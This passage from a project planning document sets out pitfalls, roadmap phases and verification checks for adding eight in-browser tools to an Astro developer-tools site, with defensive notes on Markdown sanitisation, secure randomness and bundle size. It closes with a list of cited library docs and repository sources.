How roadmap phases should address these pitfalls. Suggested additive order: **wiring/tests → light generators/text → Markdown (security) → Diff → SQL (bundle spike) → QR last (library spike)**. Do not start with QR or Markdown without the island-split decision.

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Catalog / `ToolIsland` / `ZH_ERRORS` / `TOOLS.length` (Pitfall 9) | Phase 1 — additive tool contract (shared), before any of the eight UIs | Test: every slug has en+zh markdown + island; `getRelatedTools` resolves; featured count is an explicit choice not a stale `6` |
| Island graph / static imports (Pitfall 6) | Phase 1 wiring + re-check after SQL and QR | `astro build` chunk list: json-formatter page bytes ≈ baseline |
| Word count CJK (Pitfall 7) | Word/character counter phase (early; no fat deps) | Fixtures `你好…`, emoji; EN vs ZH locale segmenter |
| Lorem unbounded generate (Pitfall 10) | Lorem phase (early) | Max paragraphs; no `fetch`; output cap |
| Case/Slug unicode (Pitfall 7) | Case/Slug phase | Non-empty CJK slug; empty-strip error; camelCase ASCII fixtures |
| Password CSPRNG (Pitfall 3) | Password phase | No `Math.random`; rejection sampling unit test; empty charset |
| Markdown XSS (Pitfall 1) | Markdown phase (after wiring; treat as security-gated) | XSS fixtures; no unsanitized innerHTML; security_enforcement / ASVS as configured |
| Markdown remote images (Pitfall 2) | Same Markdown phase | Default preview makes **zero** network calls |
| Diff UX + timeout (Pitfall 8) | Diff phase (needs UI-SPEC) | Two-pane or inline; ignore whitespace; abort message on pathological input |
| SQL dialects + tree-shake (Pitfall 4) | SQL phase — **spike first** (`formatDialect`, locked dialects) | Dialect UI; Postgres/MySQL fixtures; chunk does not contain unused dialects |
| QR camera/WASM/file (Pitfall 5) | QR phase last — **spike first** (encode PNG, decode File, gzip budget) | No getUserMedia; file cap; Firefox decode path; generate download; json-formatter chunk unchanged |
| Limits gaps (Pitfall 10) | Each tool phase + a short shared limits pass when the first live-preview tool lands | Per-tool max constants; debounce on live tools |
| Do not rewrite existing ten | Every phase | PR diff for `src/components/tools/{Json,Jwt,Base64,…}.tsx` empty except catalog-related data if required |

**Research flags (deeper spike required, do not plan as "just pick a library"):**
- SQL: confirm `formatDialect` tree-shakes in this Astro/Vite 7 build.
- QR: decode library + gzip + Firefox; reject WASM unless measured.
- Markdown: DOMPurify config matrix (img forbid vs hook) + iframe sandbox vs in-page preview.
- `ToolIsland` code-split: whether per-slug Astro components are required vs dynamic import inside one switch.
- `Intl.Segmenter` support vs fallback for the site's browser targets.

**Unlikely to need extra research:** Lorem (local word list), password (follow UUID/hash crypto pattern), case conversion ASCII modes.

## Sources

### Official / library docs (MEDIUM — Context7)

- Marked security warning and DOMPurify example; removed `sanitize` option — [markedjs/marked README](https://github.com/markedjs/marked/blob/master/README.md), [USING_ADVANCED.md](https://github.com/markedjs/marked/blob/master/docs/USING_ADVANCED.md), [USING_PRO.md](https://github.com/markedjs/marked/blob/master/docs/USING_PRO.md)
- DOMPurify defaults, `FORBID_TAGS`, URI hooks, `SAFE_FOR_XML`, `KEEP_CONTENT`, `DEFAULT_DATA_URI_TAGS` — [cure53/dompurify](https://github.com/cure53/dompurify)
- sql-formatter dialects, default `sql` is not autodetection, `formatDialect` bundle-size API — [docs/language.md](https://github.com/sql-formatter-org/sql-formatter/blob/master/docs/language.md), [docs/dialect.md](https://github.com/sql-formatter-org/sql-formatter/blob/master/docs/dialect.md)
- jsdiff `diffLines` options, `timeout`, `maxEditLength`, callback, line vs word/char cost — [kpdecker/jsdiff](https://github.com/kpdecker/jsdiff)
- Astro `client:load` / `client:visible` / `client:only`, islands send JS only when directed — [Astro framework components](https://docs.astro.build/en/guides/framework-components/), [islands](https://docs.astro.build/en/concepts/islands/)

### Web search (LOW — not fetched; do not treat as authoritative)

- `crypto.getRandomValues` vs `Math.random`; modulo bias / rejection sampling — MDN consensus plus secondary blogs
- QR: jsQR age/speed, `@zxing/*` gzip, `zxing-wasm` ~1MB, `BarcodeDetector` gaps, `paulmillr/qr` — mixed ecosystem writeups
- `qrcode` (soldair) SVG via `toString` not `toDataURL`; `toFile` Node-only
- CJK slug empty on ASCII slugify; pinyin lossiness
- `Intl.Segmenter` word/grapheme vs `split(/\s+/)` for CJK — [web.dev Intl.Segmenter](https://web.dev/blog/intl-segmenter)
- isomorphic-dompurify browser field vs jsdom (LOW; prefer importing `dompurify` directly in the island to avoid the question)

### This repository (HIGH)

- `.planning/PROJECT.md` — eight tools, in-browser only, EN+ZH, no camera, do not rewrite the ten
- `.planning/codebase/ARCHITECTURE.md` — ToolIsland switch, `ToolShell`, lib result unions
- `.planning/codebase/CONCERNS.md` — regex ReDoS, no CSP, island/content alignment, error-string i18n
- `src/components/tools/ToolIsland.astro` — static imports + `client:load`
- `src/components/ToolShell.tsx` — text-only output
- `src/lib/limits.ts` — 100k char cap only
- `src/i18n/errors.ts` — exact English → ZH map
- `src/data/tools.test.ts` — `toHaveLength(10)`
- `src/components/tools/UuidGenerator.tsx` / `src/lib/hash.ts` — existing Web Crypto bar

---

*Pitfalls research for: Devtoolbox more-tools milestone (8 in-browser tools)*
*Researched: 2026-09-11*
